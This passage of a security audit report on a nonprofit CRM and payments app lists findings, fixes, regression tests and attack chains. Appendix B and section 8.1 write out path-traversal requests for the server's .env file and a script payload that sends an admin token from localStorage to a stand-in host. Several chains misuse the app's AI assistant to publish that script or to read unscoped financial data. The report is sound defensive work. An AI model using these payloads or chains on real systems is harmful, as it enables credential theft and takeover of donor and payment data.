1. Verify content with magic-byte sniffing (`file-type`) and reject any file whose real type disagrees with its declared type or its extension.
2. **Drop `image/svg+xml`** from the allowlist. If SVG is genuinely required, sanitise it server-side with DOMPurify in SVG mode and always serve it with `Content-Type: image/svg+xml`, `Content-Disposition: attachment`, and `X-Content-Type-Options: nosniff`.
3. Always set an explicit `Content-Type` from a server-side allowlist on `/file/*`, plus `X-Content-Type-Options: nosniff` and `Content-Disposition: attachment` for anything that is not a known-safe raster image.
4. Serve user-uploaded content from a **separate origin** (or an S3/R2 bucket domain) so stored active content cannot touch the application origin's DOM or storage.
5. Add antivirus scanning (ClamAV or an equivalent service) before a file is marked available.
6. Re-encode all raster images unconditionally (currently skipped when `sharp` is unavailable) to strip embedded payloads and EXIF.

### H-12 — 21 known-vulnerable dependencies
**CWE-1395** · `server/package.json`, `client/package.json`

`npm audit`: **11 server vulnerabilities (6 high, 5 moderate)** and **10 client (5 high, 3 moderate, 2 low)**.

| Package | Sev | Issue | Relevance here |
|---|---|---|---|
| `nodemailer` ≤9.0.0 | High | CRLF header injection; `disableFileAccess` bypass enabling arbitrary file read + SSRF; improper TLS validation in OAuth2 token fetch | Used for password resets, invites, receipts — the file-read and header-injection paths are directly reachable |
| `ip-address` ≤10.3.0 (via `express-rate-limit`) | High | Leading-zero octets decoded as decimal, enabling SSRF / trust-boundary bypass | Sits inside the rate limiter's IP normalisation — bypass risk |
| `qs` (via `express` 4.21–4.22.1) | Moderate | Remotely triggerable DoS | Every request parses query strings |
| `morgan` ≤1.10.1 | Moderate | Log forging via unneutralised control characters | Corrupts the audit trail used for incident response |
| `postcss`, `vite`, `nanoid` (client) | High | Arbitrary file read via `sourceMappingURL`; `server.fs.deny` bypass | Build-time and dev-server exposure |
| `multer` 1.4.5-lts.2 | — | 1.x is deprecated/EOL upstream | Handles every file upload |

**Fix:** run `npm audit fix` in both workspaces, then migrate `multer` to 2.x (breaking API changes — budget for it). Add `npm audit --audit-level=high` to CI as a merge gate, and enable Dependabot or Renovate.

### H-13 — No Content-Security-Policy on the SPA; secrets stored in plaintext at rest
**CWE-1021 / CWE-311** · [client/vercel.json](../client/vercel.json), `payment_gateway_settings`

**No CSP for the client.** `client/vercel.json` sets only `Cache-Control`. `helmet()` in `server/src/index.js:87` protects API *responses*, not the statically-hosted HTML document where the application actually runs. With no CSP, the C-05 XSS has no secondary containment: inline script executes and can exfiltrate to any origin.

**Gateway credentials are plaintext in the database.** `payment_gateway_settings` holds `transaction_key`, `signature_key`, `api_key`, `app_key`, and `webhook_secret` unencrypted. They are correctly masked on read (`payments.js:1428`), but any database read — including via the C-01 → `DB_PASSWORD` chain — yields live gateway credentials, which permit forged webhooks (marking invoices paid without payment) and potentially direct gateway API access. Only `services/google.js` uses `createCipheriv`; that pattern should be applied here.

**Fix:**
1. Add security headers to `client/vercel.json` for all paths:
   `Content-Security-Policy` (start in `Content-Security-Policy-Report-Only`, then enforce: `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; connect-src 'self' <api-origin>`), plus `Strict-Transport-Security: max-age=31536000; includeSubDomains`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, and a restrictive `Permissions-Policy`.
   Note the payment iframe (Passage.js) will need explicit `frame-src`/`script-src` entries — enumerate them during the report-only phase.
2. Encrypt gateway secrets at rest with the `google.js` AES-GCM pattern, keyed from a secrets manager (not `.env`).
3. Move all secrets out of `.env` files into a managed secret store (AWS Secrets Manager, Vault, or the host's encrypted env store) with a documented rotation policy — `SECURITY 1.md §5` already requires this.

---

## 5. Medium-severity findings

### M-01 — Error handler leaks internals; `NODE_ENV=development` in the committed env
[server/src/middleware/errorHandler.js:16](../server/src/middleware/errorHandler.js#L16) · `server/.env`

`server/.env` currently sets `NODE_ENV=development`. Deployed as-is, the error handler attaches **full stack traces** to every error response, disclosing file paths, module layout, and library versions. Even in production, `payload.error = err.message` is returned for 500s, so raw MySQL errors (table and column names, constraint details) reach the client.

**Fix:** set `NODE_ENV=production` in deployed environments and assert it at boot. Return a generic `"Internal server error"` plus a correlation id for any status ≥ 500, logging the detail server-side only. Keep the existing Zod 400 behaviour, which is appropriate.

### M-02 — Financial integrity: unvalidated cart quantities and client-controlled tax/shipping
[server/src/routes/cart.js:68](../server/src/routes/cart.js#L68), [server/src/routes/checkout.js:210](../server/src/routes/checkout.js#L210)

Prices are correctly re-derived server-side from the database — no direct price tampering. But:

- **`POST /api/cart/items` does not validate `qty`.** `Number(qty)` accepts negatives and fractions; the guard `newQty > product.stock_qty` is false for negatives, and untracked-inventory products skip it entirely. A negative-quantity line yields a negative subtotal, letting an attacker discount or zero out a cart total (`cartPayload` sums `unit_price * qty` unconditionally). `PUT /items/:id` guards with `!qty || qty < 1`; `POST` does not.
- **`PUT /api/cart/items/:id` omits the stock check** for products, so quantity can exceed `stock_qty` after the fact.
- **`tax_exempt` is a client-supplied boolean** in both `/estimate` and `/complete`, passed straight into `calcTax`. Any customer can self-declare tax exemption.
- **`shipping_rate_id` is client-chosen** with no validation that the rate belongs to the shipping address's zone.

**Fix:** validate `qty` as `z.number().int().min(1).max(<sane cap>)` at every mutation point; re-check stock on update; derive `tax_exempt` from the server-side contact/organisation record, never the request; and validate `shipping_rate_id` against the zone resolved from the shipping address. Add a final assertion that the computed total is `> 0` and matches the sum of line items before charging.

### M-03 — Public form submission: no abuse controls, unbounded storage, unauthenticated contact overwrite
[server/src/routes/forms.js:113](../server/src/routes/forms.js#L113)

- No rate limit and no CAPTCHA — only a honeypot (`body.__hp`), which any targeted script bypasses.
- `data_json = JSON.stringify(body)` stores the **entire** request body with no field allowlist and no size cap beyond Express's global 10 MB, so each request can persist ~10 MB of arbitrary JSON.
- **Existing contacts are overwritten.** When a submitted email matches an existing contact, the handler `UPDATE`s that record with attacker-supplied values across the 17 `ALLOWED_CRM_FIELDS` (`first_name`, `last_name`, `phone`, address fields, `lifecycle_stage`, `lead_source`, `notes`). An unauthenticated attacker who knows a donor's email address can corrupt their CRM record, including their contact details.

**Fix:** add a rate limit (e.g. 5/hour/IP per form) and a CAPTCHA (hCaptcha/Turnstile); store only fields declared in `form_fields` for that form, with a per-field length cap and a total payload cap; and **never update an existing contact from an unauthenticated submission** — write to a moderation queue for staff review instead, or restrict updates to filling fields that are currently empty.

### M-04 — Weak and inconsistent password policy; inconsistent bcrypt cost
[server/src/routes/users.js:135](../server/src/routes/users.js#L135)

| Location | Minimum | bcrypt cost |
|---|---|---|
| `users.js:135` (admin-set password) | **6** | 10 |
| `users.js:115` (user creation) | 8 | 10 |
| `invites.js:79` (invite acceptance) | — | 10 |
| `portal.js:68` (temp password) | — | 10 |
| `auth.js:201` (password reset) | 8 | **12** |
| `portal.js:180` / `1046` | 8 | **12** |

No complexity requirement, no breached-password check, no password history, and no expiry anywhere. The weakest path (6 characters, cost 10) is the admin-set one.

**Fix:** enforce a single shared policy module — minimum 12 characters, checked against the Have I Been Pwned k-anonymity API (or a local breach list), with no composition rules (per NIST SP 800-63B). Standardise bcrypt cost at 12 (or migrate to Argon2id) and rehash on next successful login where the stored cost is lower.

### M-05 — Username enumeration via login timing
[server/src/routes/auth.js:50](../server/src/routes/auth.js#L50)

```js
if (!user || !user.is_active) return res.status(401).json({ error: 'Invalid credentials' });
const ok = await bcrypt.compare(password, user.password_hash);      // only runs if user exists
```

A non-existent email returns in a few milliseconds; an existing one incurs a ~100 ms bcrypt comparison. The gap is large and stable enough to enumerate valid accounts remotely — useful for targeting credential stuffing and phishing. (`/forgot-password` is correctly non-enumerating.)

**Fix:** always perform a bcrypt comparison against a fixed dummy hash when the user is absent, so both paths cost the same.

### M-06 — CORS allows requests with no `Origin` header
[server/src/index.js:98](../server/src/index.js#L98)

```js
if (!origin || allowedOrigins.includes(origin)) return cb(null, true);
```

The allowlist itself is correct — an explicit list from `CLIENT_ORIGIN`, no wildcard, no origin reflection, with `credentials: true`. Permitting a missing `Origin` is a deliberate convenience for curl/Postman/server-to-server callers and is **not** a browser-exploitable hole: browsers always send `Origin` on cross-origin XHR/fetch, and the application uses bearer tokens rather than cookies, so there is nothing for a browser to attach automatically.

Worth noting for two reasons: it weakens defence in depth against non-browser clients, and **if H-05's refresh-cookie recommendation is adopted, this becomes exploitable** and must be tightened first.

**Fix:** keep the allowance only for specific server-to-server routes (webhooks) that authenticate by signature; require a matching `Origin` for everything else. Ensure `CLIENT_ORIGIN` is set to the exact production origin (it is currently `http://localhost:5178`).

### M-07 — Audit logging is best-effort and unmonitored
[server/src/routes/auth.js:60](../server/src/routes/auth.js#L60), throughout

Audit writes to `activities` are consistently wrapped in `catch (_e) { /* non-fatal */ }` or `.catch(() => {})`. Login, logout, password reset, impersonation, and payment webhook events all silently vanish if the insert fails. There is no integrity protection (records are mutable by anyone with database access), no alerting on anomalies, and role changes (C-03) and AI tool calls (C-02) are not logged at all.

**Fix:** treat security-relevant audit events as non-optional — if the audit write fails, fail the request. Log to an append-only sink (or a table with `INSERT`-only grants for the app user) separate from application data. Add the missing events: role and permission changes, every AI tool invocation, permission denials, admin-initiated password resets, gateway setting changes, and vault operations. Add alerting for volume spikes, off-hours administrative activity, and repeated 403s — per `SECURITY 1.md §4`.

### M-08 — AI feature does not meet the organisation's own AI security checklist
`SECURITY 1.md` · [server/src/services/ai.js](../server/src/services/ai.js)

The repository already contains an AI Security & Compliance Checklist. The current implementation fails most of it:

| Requirement | Status |
|---|---|
| §1 Redaction pipeline before prompts | **Fail** — full contact PII and payment history flow into context unredacted |
| §2 Untrusted content never treated as instructions | **Fail** — KB articles and database content enter context with no instruction-source boundary |
| §2 Human-in-the-loop for side-effectful actions | **Fail** — 8 write tools execute directly; the system prompt instructs the model to do so |
| §3 Tool permissions scoped, not admin-equivalent | **Fail** — effectively admin-equivalent (C-02) |
| §3 Row/tenant scope enforced server-side | **Fail** — no scoping at all |
| §4 Every AI read/write logged with actor | **Fail** — no tool-level audit logging |
| §5 Rate limiting and cost monitoring | **Fail** — neither |
| §6 PCI: card data never reaches AI context | **Pass** — no PAN/CVV exists to leak; `get_payment_history` should still be confirmed to exclude `card_last4` |
| §1 DPA signed with provider | **Verify** — confirm the Anthropic commercial terms and zero-retention posture |

**Fix:** implement C-02's remediation, then walk the checklist formally and record the outcome. Add adversarial prompt-injection tests to CI (§2's pre-launch requirement): seed a KB article and a contact note containing embedded instructions, then assert the assistant does not act on them.

---

## 6. Assessed and found sound

Recording what holds up, both for balance and so remediation does not regress it.

### 6.1 CSRF — not applicable by design
No cookies are used anywhere in the server (`grep -rn "cookie" server/src` returns nothing). Authentication is a bearer token in the `Authorization` header, which browsers never attach automatically, so classic CSRF is structurally impossible. This is a legitimate design choice; the trade-off is `localStorage` XSS exposure (C-05, H-05).

**If the H-05 refresh-cookie recommendation is adopted, CSRF becomes live** and must be addressed at the same time: `SameSite=Strict`, a double-submit CSRF token on the refresh endpoint, and tightening M-06 first.

### 6.2 SQL injection — sound
All 44 dynamic-SQL sites were traced. Every one builds only *identifiers* dynamically, and always from a hardcoded allowlist:
- `cmsData.js` — table names from a hardcoded `DATA_TYPES` registry; columns from a per-type `fields` allowlist.
- `import.js` — table from a two-value ternary; columns filtered through `ALLOWED_CONTACT_FIELDS` / `ALLOWED_ORG_FIELDS`.
- `automations.js:238` — table from a hardcoded `tableMap`.
- All `UPDATE … SET ${fields}` patterns — keys from fixed arrays or Zod-validated schemas, values always bound.
- `scope.js` `ownerClause` / `contactOwnerClause` / `taskClause` — ids passed through `parseInt` before inlining.
- `website.js:289` public search — fully parameterised.

Values are bound throughout via `namedPlaceholders`. The `scripts/check-sql-safety.js` guard is a good practice worth keeping in CI.

### 6.3 Payment webhook integrity — sound
`payments.js:976` (Authorize.net) and `:1104` (Valor) both verify HMAC signatures (SHA-512 / SHA-256) using `crypto.timingSafeEqual` with defensive length handling, parse the body only *after* verification (using `express.raw` to preserve the exact bytes), and **fail closed** when no secret is configured (`:1114` returns 503 rather than accepting). This is a correct implementation.

### 6.4 Card data handling — sound (PCI-conscious)
No PAN or CVV column exists anywhere in `db/schema.sql`. `vault_profiles` stores only gateway tokens plus `last4`, `card_brand`, `cardholder_name`, and `expiry`; card capture happens in the Passage.js iframe so raw card data never touches this server. `vault.js:341` explicitly avoids returning `card_token` or vault ids to the client. This materially limits PCI scope — protect it during remediation.

### 6.5 Other controls verified working
- **`JWT_SECRET` is mandatory** with no fallback and a length check that refuses to boot (`middleware/auth.js:11`) — a previous `'dev-secret'` fallback was correctly removed.
- **Capability-token URLs** for receipts and invoices (256-bit random, regex-validated, enumerable `:paymentId` form removed) — the right pattern; C-04 leaks the tokens but the design is sound.
- **Row-level scope checks present** on `contacts.js:191` and `deals.js:116` GET-by-id — direct URL id tampering is correctly blocked there.
- **Portal isolation** — `router.use(requireAuth, requirePortal)` is placed after the public register/verify routes (`portal.js:247`), and all 20+ downstream routes scope by `getScope()`'s `contact_id`/`organization_id`.
- **Cart item operations** are correctly scoped by `cart_id` (no cross-cart IDOR), with a 256-bit random `session_key`.
- **Password reset** — cryptographically random token, only its SHA-256 hash stored, 1-hour expiry, single-use, non-enumerating 200 response.
- **Portal self-registration requires email verification** (`portal.js:156`) — the account is created `is_active = 0` with a hashed, 24-hour, single-use verify token, and `requireAuth` rejects inactive users. Auto-linking to an existing contact by email is safe because the verification mail goes to that contact's real address, so an attacker cannot claim a known donor's record. Note this is an anti-abuse control, not an identity control: any attacker-controlled inbox satisfies it (see Chain 3).
- **Login rate limiter design** — keyed on email + IP with `ipKeyGenerator` IPv6 /64 normalisation and `skipSuccessfulRequests`. Well-reasoned; undermined only by H-06.
- **Google OAuth** uses a signed state JWT carrying the user id, and encrypts stored tokens with AES-GCM.
- **Attachment downloads** force `application/octet-stream` + `Content-Disposition: attachment` with a sanitised filename — the media routes should copy this.
- **Temp passwords** are not returned in API responses (correct — avoids proxy log capture).
- **`SELECT` column lists are explicit** on sensitive portal reads rather than `SELECT *`.

---

## 7. Remediation plan

Ordered by exploitability × impact. Effort estimates assume one experienced engineer.

### Phase 0 — Emergency (within 24 hours)

| # | Action | Effort |
|---|---|---|
| C-01 | Add `safeLocalPath()` containment to `services/storage.js`; add `KEY_RE` validation at `media.js:86` | 1 h |
| C-01 | **Rotate every secret**: `JWT_SECRET`, `DB_PASSWORD`, all gateway credentials, SMTP, Twilio, Anthropic, Google OAuth | 2 h |
| C-01 | Grep access logs for `/api/website/media/file/` requests containing `%2e` or `..`; assess breach | 2 h |
| C-04 | Remove `receipt_token` from the `GET /public/invoice/:id` response | 15 m |
| C-02 | Disable `POST /api/ai/chat` (feature flag) until the authorisation layer lands | 15 m |
| C-03 | Reject `role_ids` when `id === req.user.id`; add a grantable-role allowlist to `POST /` and `PUT /:id` | 3 h |
| M-01 | Set `NODE_ENV=production`; assert it at boot | 15 m |

**Phase 0 total: ~1 day.** C-01 alone justifies treating this as an incident: assume the current secrets are compromised.

### Phase 1 — Critical (week 1)

| # | Action | Effort |
|---|---|---|
| C-02 | Build `TOOL_POLICY`; thread `req.user` into `executeTool`; enforce permission + `resolveOwnerScope` per tool; filter the advertised tool list; block `portal`; rate limit; audit-log | 3 d |
| C-05 | Add `isomorphic-dompurify`; sanitise on write and at all 7 `dangerouslySetInnerHTML` sites; escape in `markdownToHtml` | 1 d |
| C-04 | Retire `GET /public/invoice/:id` (migrate any live pre-token pay-links first) | 4 h |
| H-04 | Require token proof-of-possession on `donations/public/finalize/:invoiceId` | 3 h |
| H-02 | Add permission + scope checks to `GET /api/notes` | 2 h |
| H-03 | Add parent-entity scope checks to attachment download and the other 4 unscoped modules | 1 d |
| H-06 | Configure `app.set('trust proxy', <hops>)`; switch to `req.ip` throughout; verify | 3 h |
| H-13 | Add CSP (report-only → enforce) + HSTS + `nosniff` + `Referrer-Policy` to `vercel.json` | 4 h |
| H-12 | `npm audit fix` both workspaces; add `--audit-level=high` CI gate | 4 h |

**Phase 1 total: ~7 days.**

### Phase 2 — High (weeks 2–3)

| # | Action | Effort |
|---|---|---|
| H-07 | Global baseline limiter + per-route limits on the 7 endpoints in the H-07 table; AI cost budget | 1 d |
| H-09 | `roles.is_system`; permission-based admin bypass; forbid self-role edits and privilege-exceeding grants | 1 d |
| H-10 | Invert the `resolveOwnerScope` fallback to least-privilege; add `roles.scope_type` | 1 d |
| H-05 | `jti` + revocation table; `users.token_epoch`; fix impersonation claims; shorten token lifetimes | 3 d |
| H-11 | Magic-byte validation; drop SVG; explicit `Content-Type` + `nosniff`; AV scanning; separate asset origin | 3 d |
| H-08 | Rate limit + lengthen + hash + `timingSafeEqual` + expiry for check-in PINs | 4 h |
| H-13 | Encrypt gateway secrets at rest; migrate secrets to a managed store | 2 d |
| M-07 | Make security audit writes non-optional; add missing events; append-only sink; alerting | 2 d |

**Phase 2 total: ~14 days.**

### Phase 3 — MFA and passkeys (weeks 4–6)

This is H-01, sized separately because it is a feature, not a patch.

**Recommended stack:** `@simplewebauthn/server` + `@simplewebauthn/browser` for WebAuthn/passkeys, and `otplib` for TOTP as the universally-supported fallback.

**Schema:**
```sql
CREATE TABLE user_mfa_totp (
  user_id      INT PRIMARY KEY,
  secret_enc   VARBINARY(255) NOT NULL,          -- AES-GCM, same pattern as google.js
  confirmed_at DATETIME NULL,
  created_at   DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);
CREATE TABLE user_mfa_credentials (                -- WebAuthn / passkeys
  id              INT AUTO_INCREMENT PRIMARY KEY,
  user_id         INT NOT NULL,
  credential_id   VARBINARY(255) NOT NULL UNIQUE,
  public_key      VARBINARY(1024) NOT NULL,
  sign_count      BIGINT UNSIGNED NOT NULL DEFAULT 0,
  transports      VARCHAR(120) NULL,
  device_name     VARCHAR(120) NULL,
  backed_up       TINYINT(1) NOT NULL DEFAULT 0,
  last_used_at    DATETIME NULL,
  created_at      DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);
CREATE TABLE user_mfa_recovery_codes (
  id         INT AUTO_INCREMENT PRIMARY KEY,
  user_id    INT NOT NULL,
  code_hash  CHAR(64) NOT NULL,                   -- SHA-256 of a single-use code
  used_at    DATETIME NULL,
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);
ALTER TABLE users ADD COLUMN mfa_required TINYINT(1) NOT NULL DEFAULT 0;
ALTER TABLE users ADD COLUMN token_epoch  INT NOT NULL DEFAULT 0;   -- also serves H-05
```

**Login flow change.** `POST /api/auth/login` must stop returning a full session token when MFA is enrolled. Instead return a short-lived (5 min), single-purpose `mfa_pending` token that carries **no permissions** and is accepted only by `POST /api/auth/mfa/verify`. Only after successful verification is the real session token issued. Rate limit `/mfa/verify` per user (5 attempts, then lock and alert).

**Endpoints:**
```
POST /api/auth/mfa/totp/setup      → provisioning URI + QR (authenticated)
POST /api/auth/mfa/totp/confirm    → verify first code, set confirmed_at
POST /api/auth/mfa/passkey/register/options
POST /api/auth/mfa/passkey/register/verify
POST /api/auth/mfa/verify          → TOTP code | passkey assertion | recovery code
POST /api/auth/mfa/passkey/login/options   (usernameless/discoverable flow)
DELETE /api/auth/mfa/passkey/:id   → requires re-authentication
GET  /api/auth/mfa/status
POST /api/auth/mfa/recovery-codes/regenerate
```

**Policy:**
- **Mandatory** for any user holding `admin`, `users.manage`, `roles.manage`, `payments.write`, `donations.write`, or `settings.manage` — enforce via `mfa_required`, checked in `requireAuth`.
- **Optional but strongly prompted** for portal customers (they can charge saved cards).
- **Step-up re-authentication** for high-risk actions regardless of session age: adding or charging a vault payment method, changing gateway settings, changing roles, starting an impersonation session, and exporting donor data.
- Set the WebAuthn RP ID to the production domain; require user verification; store and validate `sign_count`.
- Issue 10 single-use recovery codes at enrolment, display once, store only SHA-256 hashes.
- Audit-log enrolment, removal, every failed verification, and every recovery-code use.

**Effort: ~10 days** including the client UI, the login-flow refactor, and tests.

### Phase 4 — Remaining medium items and hardening (weeks 7–8)

| # | Action | Effort |
|---|---|---|
| M-02 | Validate cart quantities; server-derive `tax_exempt`; validate `shipping_rate_id` against zone; assert totals | 1 d |
| M-03 | Form rate limit + CAPTCHA; field allowlist and size caps; moderation queue instead of contact overwrite | 2 d |
| M-04 | Shared password-policy module; HIBP check; bcrypt cost 12 with rehash-on-login | 1 d |
| M-05 | Dummy bcrypt comparison on the absent-user path | 30 m |
| M-06 | Restrict the missing-`Origin` allowance to signature-authenticated webhook routes | 2 h |
| M-08 | Complete the `SECURITY 1.md` walkthrough; add prompt-injection tests to CI | 2 d |
| — | Migrate `multer` to 2.x | 1 d |
| — | Add `express-slow-down` on auth endpoints; consider account lockout with admin unlock | 1 d |

**Phase 4 total: ~9 days.**

### Timeline summary

| Phase | Duration | Cumulative |
|---|---|---|
| 0 — Emergency | 1 day | 1 d |
| 1 — Critical | 7 days | 8 d |
| 2 — High | 14 days | 22 d |
| 3 — MFA / passkeys | 10 days | 32 d |
| 4 — Medium / hardening | 9 days | 41 d |

**~8 weeks** for one engineer to reach a defensible posture for a financial application.

---

## 8. Verification plan

Every fix needs a test that fails against the current code. Add these to CI so the classes cannot regress.

### 8.1 Regression tests (per finding)

```
C-01  GET /api/website/media/file/%2e%2e%2f%2e%2e%2fserver/.env        → 400, and body ≠ env contents
      GET /api/website/media/file/..%2f..%2f.env                        → 400
      GET /api/website/media/file/<valid registered key>                → 200 (no regression)
C-02  portal user → POST /api/ai/chat "what is our total revenue"       → refusal, no figures
      sales agent → POST /api/ai/chat "show all contacts"               → only owned contacts
      user without settings.manage → "publish blog post 1"              → refusal
C-03  PUT /api/users/<self> {role_ids:[admin]} as users.manage holder   → 403
      POST /api/users {role_ids:[admin]} as non-admin                   → 403
C-04  GET /api/payments/public/invoice/1                                → 404/410 (retired)
C-05  save blog body "<script>x</script>" → fetch public page           → no <script> in response
H-02  authenticated non-privileged GET /api/notes?entity_id=<other>     → 403
H-03  agent A GET /api/attachments/<B's attachment>/download            → 403
H-04  POST /api/donations/public/finalize/1 with no token               → 401/403
H-08  11 wrong PINs to /public/checkin/1/scan                           → 429 on the 11th
H-09  PUT /api/roles/<system role> {name:"x"}                           → 403
H-10  user with an uncategorised custom role, GET /api/contacts         → own records only
H-11  upload a .svg / an .html renamed .png with image/png MIME          → 400
M-02  POST /api/cart/items {qty:-5}                                     → 400
M-05  timing distribution for existing vs non-existent email            → overlapping
```

### 8.2 Continuous controls
- `npm audit --audit-level=high` as a merge gate in both workspaces; Dependabot or Renovate enabled.
- Keep `scripts/check-sql-safety.js` in CI and extend it to flag any `path.join` on request-derived input.
- **Route authorisation coverage test:** enumerate the Express router stack at boot and assert every route is either in an explicit `PUBLIC_ROUTES` allowlist or carries `requireAuth`. This turns the manual audit in §2 into an automated invariant and is the single highest-value test to add.
- Static analysis: `eslint-plugin-security` plus Semgrep with the `javascript.express` and `javascript.jwt` rulesets.
- Prompt-injection suite for the AI feature (M-08).

### 8.3 Independent validation
After Phase 2, commission an external penetration test scoped to authorisation logic, the public endpoint surface, and the payment flows. After Phase 3, re-test the authentication and MFA flows specifically. Retain the reports for SOC 2 and payment-partner due diligence.

---

## 9. Compliance notes

| Framework | Applicability | Current gaps |
|---|---|---|
| **PCI-DSS** | SAQ A / A-EP — no PAN/CVV stored; card capture is iframe-delegated | Req. 6.5.1/6.5.8 (injection, IDOR): C-01, C-04, H-02/03/04. Req. 8.3 (MFA for all administrative access): H-01. Req. 8.2 (password strength): M-04. Req. 10 (audit trails): M-07. Confirm the SAQ level with the acquirer — the C-05 XSS on payment-adjacent pages can push an A-EP merchant toward stricter requirements |
| **GDPR / CCPA** | Applies if any EU or California data subject exists in `contacts` | C-01, C-04, H-02 are personal-data breaches if exploited. Art. 32 (security of processing) is not currently met. Art. 33 imposes a 72-hour notification duty — the log review in Phase 0 determines whether this is already live |
| **SOC 2** | Required if selling to business customers | CC6.1 (logical access): C-02, C-03, H-09, H-10. CC6.6 (boundary protection): C-01. CC6.7 (transmission/encryption at rest): H-13. CC7.2 (monitoring): M-07. H-01 will be raised in essentially every procurement review |
| **State AI disclosure laws** | Applies where the assistant faces customers or automates communications | Disclosure requirement not yet assessed — confirm whether the assistant is customer-facing; `SECURITY 1.md §7` requires the privacy policy and ToS to disclose AI use |
| **Nonprofit / IRS substantiation** | Donation receipting and year-end statements | H-04's unauthenticated donation-record tampering directly threatens the integrity of tax-receipting data |

---

## 10. Appendix A — Findings index

| ID | Severity | Title | Primary location |
|---|---|---|---|
| C-01 | Critical | Unauthenticated arbitrary file read (path traversal) → full compromise | `media.js:86`, `storage.js:42` |
| C-02 | Critical | AI assistant bypasses all permissions and row scoping | `ai.js:17`, `services/ai.js:392` |
| C-03 | Critical | Privilege escalation to admin via self-service role assignment | `users.js:107,141`, `scope.js:44` |
| C-04 | Critical | Unauthenticated mass PII harvest via enumerable invoice IDs | `payments.js:177` |
| C-05 | Critical | Stored XSS on the public site → admin session theft | `services/ai.js:365`, `BlogPostPage.jsx:112` |
| H-01 | High | No MFA/2FA/passkey of any kind | `routes/auth.js` |
| H-02 | High | IDOR — any user reads any entity's notes | `notes.js:12` |
| H-03 | High | IDOR — attachment download lacks row-level scope | `attachments.js:116` |
| H-04 | High | Unauthenticated financial-record tampering + token leak | `donations.js:234` |
| H-05 | High | No session revocation; tokens in `localStorage`; broken impersonation audit | `middleware/auth.js:20` |
| H-06 | High | `trust proxy` unset — rate limiting ineffective behind a proxy | `index.js` |
| H-07 | High | No global rate limiting (~500 endpoints) | `index.js` |
| H-08 | High | 6-digit check-in PIN, unlimited attempts | `events.js:239`, `volunteers.js:116` |
| H-09 | High | Role-name-based admin bypass allows escalation by rename | `middleware/auth.js:83`, `roles.js:78` |
| H-10 | High | Row-level scoping fails open for unrecognised roles | `scope.js:64` |
| H-11 | High | Upload validation trusts client MIME; SVG allowed | `media.js:18`, `cmsData.js:42` |
| H-12 | High | 21 known-vulnerable dependencies | `package.json` (both) |
| H-13 | High | No CSP on the SPA; gateway secrets plaintext at rest | `vercel.json`, `payment_gateway_settings` |
| M-01 | Medium | Error handler leaks internals; `NODE_ENV=development` | `errorHandler.js:16` |
| M-02 | Medium | Unvalidated cart quantities; client-controlled tax/shipping | `cart.js:68`, `checkout.js:210` |
| M-03 | Medium | Public form abuse; unauthenticated contact overwrite | `forms.js:113` |
| M-04 | Medium | Weak, inconsistent password policy and bcrypt cost | `users.js:135` |
| M-05 | Medium | Username enumeration via login timing | `auth.js:50` |
| M-06 | Medium | CORS allows requests with no `Origin` | `index.js:98` |
| M-07 | Medium | Audit logging best-effort and unmonitored | throughout |
| M-08 | Medium | AI feature fails the repo's own AI security checklist | `SECURITY 1.md` |

## 11. Appendix B — Attack chains

**Chain 1 — Unauthenticated to full administrator (C-01)**
```
GET /api/website/media/file/%2e%2e%2f%2e%2e%2fserver/.env
  → JWT_SECRET, DB_PASSWORD disclosed
  → forge JWT { sub: <admin id> }
  → full administrative API access
  → contacts, invoices, payments, vault profiles, gateway settings
```

**Chain 2 — Unauthenticated mass PII exfiltration (C-04 / H-04)**
```
for id in 1..N: GET /api/payments/public/invoice/$id      → receipt_token
                GET /api/payments/public/receipt/by-token/$token
  → name, email, phone, billing address, card brand + last4, cardholder, amount
  → for every payment in the system
```

**Chain 3 — Portal customer to full financial visibility (C-02)**
```
self-register at POST /api/portal/register, confirm via email
  (open registration; the account is created is_active=0 and needs email
   verification, so the attacker needs only a disposable inbox they control)
  → POST /api/ai/chat "revenue this year, top clients, overdue invoices"
  → executeTool runs unscoped SQL over payments / invoices / contacts
  → complete organisational financial and PII disclosure
```

**Chain 4 — Any authenticated user to administrator, via the public website (C-02 + C-05 + H-05)**
```
POST /api/ai/chat "update blog post 3: <script>fetch('//x/?t='+localStorage.lc_token)</script>, publish"
  → unsanitised body_html stored and published (no permission check)
  → administrator views the public blog page (no CSP)
  → admin JWT exfiltrated from localStorage
  → replay as administrator (no revocation available)
```

**Chain 5 — `users.manage` to administrator in one request (C-03)**
```
PUT /api/users/<own id>  { "role_ids": [<admin role id>] }
  → resolveOwnerScope includes self → scope check passes
  → no grantable-role validation → admin role assigned
  → administrator on next request
```

---

*Report generated 2026-08-21. Findings C-01 (empirically reproduced), C-02, C-03, C-04, C-05, H-02, H-03, H-04, H-08, H-09, H-10 were each traced to specific code paths and verified by reading the complete execution path. Line references are to the codebase as of this date.*
